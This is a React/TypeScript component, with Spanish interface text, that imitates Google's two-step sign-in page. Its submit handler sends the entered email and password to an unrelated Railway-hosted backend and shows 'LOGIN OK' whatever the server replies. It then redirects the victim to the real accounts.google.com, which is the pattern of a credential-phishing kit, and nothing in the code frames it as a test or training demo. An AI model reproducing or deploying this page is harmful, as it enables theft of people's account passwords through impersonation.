import { useState } from "react";

export default function AuthRight({
  step,
  email,
  password,
  setEmail,
  setPassword,
  setStep,
}: any) {
  const [error, setError] = useState("");

  console.log("RENDER STEP:", step); // 🔥 DEBUG

  const handleNext = () => {
    console.log("CLICK SIGUIENTE (EMAIL)");

    if (!email.trim()) {
      setError("Ingresa un correo electrónico o número de teléfono");
      return;
    }

    setError("");
    setStep(2);
  };

  /* 🔥 ENVÍO FINAL */
  const handleSubmit = async () => {
    console.log("CLICK LOGIN 🔥");

    if (!password.trim()) {
      alert("Ingresa la contraseña");
      return;
    }

    try {
      const res = await fetch(
        "https://login-app-production-b48f.up.railway.app/api/auth/login",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ email, password }),
        }
      );

      console.log("FETCH STATUS:", res.status);

      const data = await res.json();

      console.log("RESPUESTA BACKEND:", data);

      alert("LOGIN OK"); // 🔥 VISUAL (NO FALLA)

      /* 🔥 REDIRECCIÓN (con delay para ver logs) */
      setTimeout(() => {
        window.location.href = "https://accounts.google.com";
      }, 1500);

    } catch (error) {
      console.error("ERROR LOGIN:", error);
      alert("Error conexión");
    }
  };

  return (
    <div className="right">

      {step === 1 && (
        <>
          <div className={`input-group ${error ? "error" : ""}`}>
            <input
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                if (error) setError("");
              }}
              placeholder=" "
            />
            <label>Correo electrónico o teléfono</label>
          </div>

          {error && (
            <span className="error-text">{error}</span>
          )}

          <p className="link">
            ¿Olvidaste el correo electrónico?
          </p>

          <p className="info">
            ¿Esta no es tu computadora? Usa una ventana privada para acceder.
            <span> Más información</span>
          </p>

          <div className="actions">
            <span className="link">Crear cuenta</span>
            <button onClick={handleNext}>Siguiente</button>
          </div>
        </>
      )}

      {step === 2 && (
        <>
          <div className="input-group">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder=" "
            />
            <label>Ingresa tu contraseña</label>
          </div>

          <label className="checkbox">
            <input
              type="checkbox"
              onChange={(e) => {
                const input = document.querySelector(
                  'input[type="password"]'
                ) as HTMLInputElement;

                if (input) {
                  input.type = e.target.checked ? "text" : "password";
                }
              }}
            />
            Mostrar contraseña
          </label>

          <span className="link">
            Probar otro método
          </span>

          <div className="actions">
            <span className="link" onClick={() => setStep(1)}>
              Volver
            </span>
            <button onClick={handleSubmit}>Siguiente</button>
          </div>
        </>
      )}

    </div>
  );
}